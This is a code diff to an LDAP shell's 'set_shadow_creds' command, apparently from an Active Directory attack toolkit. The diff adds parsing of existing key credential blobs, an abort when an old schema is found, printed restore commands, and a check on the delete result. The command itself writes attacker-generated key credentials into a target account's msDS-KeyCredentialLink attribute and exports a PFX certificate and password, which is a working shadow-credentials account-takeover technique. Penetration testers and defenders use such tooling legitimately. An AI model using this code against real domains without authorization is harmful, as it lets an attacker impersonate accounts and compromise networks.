@@ -615,6 +615,23 @@ class LdapShell(cmd.Cmd):
                 raise Exception('The server returned an error: %s', self.client.result['message'])
 
     def do_set_shadow_creds(self, line):
+        def parse_key_credential_fields(blob):
+            parts = blob.split(b':', 3)
+            if len(parts) < 3 or parts[0] != b'B':
+                return None
+
+            raw = bytes.fromhex(parts[2].decode())
+            fields = {}
+            i = 4  # skip 4-byte version header
+            while i + 3 <= len(raw):
+                length = int.from_bytes(raw[i:i + 2], 'little')
+                identifier = raw[i + 2]
+                i += 3
+                value = raw[i:i + length]
+                fields[identifier] = value
+                i += length
+            return fields
+
         args = shlex.split(line)
 
         if len(args) != 1:
@@ -634,12 +651,24 @@ class LdapShell(cmd.Cmd):
         key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=target_name)
         device_id = shadow_credentials.getDeviceId()
         keyCredential = shadow_credentials.KeyCredential(key, deviceId=device_id, currentTime=shadow_credentials.getTicksNow())
-        print("KeyCredential generated with DeviceID: %s" % uuid.UUID(bytes=device_id))
+        print("KeyCredential generated with DeviceID: %s\n" % uuid.UUID(bytes=device_id))
 
         try:
             old_values = target['msDS-KeyCredentialLink'].raw_values
+
+            for blob in old_values:
+                fields = parse_key_credential_fields(blob)
+                if (0x08 in fields or fields.get(0x07) == b'\x00\x00'):
+                    print("Existing shadow credentials with old schema detected. Aborting...")
+                    return
+                print("Overwriting existing Shadow Credentials. Restore with: ")
+                print(f"restore_shadow_creds {target_name} {base64.b64encode(blob).decode()}\n")
+
             new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
             self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_DELETE, []]})
+            if self.client.result['result'] not in (0, 16):
+                print('Could not delete object: %s' % self.client.result['message'])
+                return
             self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
                 print("Shadow credentials successfully added!")
@@ -648,10 +677,6 @@ class LdapShell(cmd.Cmd):
                 shadow_credentials.exportPFX(certificate, key, password=password, path_to_file=path)
                 print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                 print("Must be used with password: %s\n" % password)
-
-                for blob in old_values:
-                    print("Detected existing Shadow Credentials. Restore with: ")
-                    print(f"restore_shadow_creds {target_name} {base64.b64encode(blob).decode()}")
             else:
                 if self.client.result['result'] == 50:
                     print('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
